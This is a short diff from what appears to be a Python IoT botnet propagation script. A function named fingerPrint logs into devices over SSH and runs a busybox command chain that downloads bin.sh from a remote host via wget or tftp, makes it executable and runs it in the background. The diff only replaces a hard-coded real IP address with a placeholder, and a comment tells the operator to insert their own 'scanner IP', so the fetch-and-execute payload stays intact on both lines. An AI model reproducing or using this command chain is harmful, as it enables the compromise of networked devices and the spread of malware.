@@ -80,7 +80,7 @@ def fingerPrint(jobID, info):
 			if boxAvailable == True:
 				try:
 					############REPLACE 255.255.255.255 WITH YOUR SCANNER IP ON THIS NEXT LINE##################
-					stdin, stdout, stderr = ssh.exec_command("sh -c \"/bin/busybox echo begining; cd /tmp; /bin/busybox wget ftp://208.68.37.54/pub/bin.sh -O bin.sh || /bin/busybox tftp -g -r bin.sh 208.68.37.54 || /bin/busybox tftp -m binary 208.68.37.54 -c get bin.sh; /bin/busybox chmod +x bin.sh; (./bin.sh || sh bin.sh) &\" < /dev/null > /dev/null 2>&1", timeout=30)
+					stdin, stdout, stderr = ssh.exec_command("sh -c \"/bin/busybox echo begining; cd /tmp; /bin/busybox wget ftp://255.255.255.255/pub/bin.sh -O bin.sh || /bin/busybox tftp -g -r bin.sh 255.255.255.255 || /bin/busybox tftp -m binary 255.255.255.255 -c get bin.sh; /bin/busybox chmod +x bin.sh; (./bin.sh || sh bin.sh) &\" < /dev/null > /dev/null 2>&1", timeout=30)
 					bricksError = stderr.read()
 					bricks=stdout.read()
 				except:
